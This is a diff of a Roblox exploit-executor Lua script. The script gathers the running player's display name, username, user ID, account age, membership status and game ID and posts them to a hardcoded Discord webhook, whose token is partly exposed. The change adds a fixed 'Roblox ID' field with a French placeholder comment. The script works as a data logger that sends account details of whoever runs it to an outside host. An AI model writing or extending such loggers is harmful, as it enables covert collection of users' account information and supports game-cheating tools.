@@ -3,6 +3,8 @@ local webhookUrl = "https://discord.com/api/webhooks/1314891658092875789/elAqUPd
 local player = game:GetService("Players").LocalPlayer
 local exploit = identifyexecutor() or "Unknown"
 
+local robloxId = 2932844883  
+
 local membershipType = "None"
 if player.MembershipType == Enum.MembershipType.Premium then
     membershipType = "Premium"
@@ -17,6 +19,7 @@ local data = {
                 { name = "Display Name", value = player.DisplayName, inline = true },
                 { name = "Username", value = player.Name, inline = true },
                 { name = "User ID", value = tostring(player.UserId), inline = true },
+                { name = "Roblox ID", value = tostring(robloxId), inline = true },  -- Ton ID Roblox ici
                 { name = "Account Age", value = tostring(player.AccountAge) .. " days", inline = true },
                 { name = "Membership Status", value = membershipType, inline = true },
                 { name = "Game ID", value = tostring(game.PlaceId), inline = true },
